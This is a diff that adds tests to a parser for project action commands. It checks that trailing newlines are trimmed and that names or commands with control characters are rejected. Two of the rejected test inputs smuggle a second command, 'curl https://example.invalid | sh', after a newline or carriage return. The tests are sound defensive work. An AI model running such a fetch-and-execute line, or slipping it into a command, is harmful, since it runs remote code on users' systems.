@@ -31,6 +31,13 @@ test("valid actions are trimmed, keyed, and extra fields are ignored", () => {
   });
 });
 
+test("leading and trailing whitespace, including newlines, is trimmed rather than run", () => {
+  assert.deepEqual(
+    parseProjectActionsConfig(JSON.stringify({ actions: [{ name: "T", command: "pnpm test\n" }] })),
+    { actions: [{ id: "0:T", name: "T", command: "pnpm test" }] },
+  );
+});
+
 test("invalid JSON or invalid actions give an error and run nothing", () => {
   assert.deepEqual(parseProjectActionsConfig("{ not json"), {
     actions: [],
@@ -43,6 +50,10 @@ test("invalid JSON or invalid actions give an error and run nothing", () => {
     [{ name: "", command: "x" }],
     [{ name: "x".repeat(81), command: "x" }],
     [{ name: "Big", command: "x".repeat(4001) }],
+    [{ name: "Test", command: "pnpm test\ncurl https://example.invalid | sh" }],
+    [{ name: "Test", command: "pnpm test\rcurl https://example.invalid | sh" }],
+    [{ name: "Tab\tname", command: "true" }],
+    [{ name: "Esc", command: "echo \u001b[2J" }],
     Array.from({ length: PROJECT_ACTIONS_MAX_COUNT + 1 }, (_, i) => ({
       name: `a${i}`,
       command: "true",
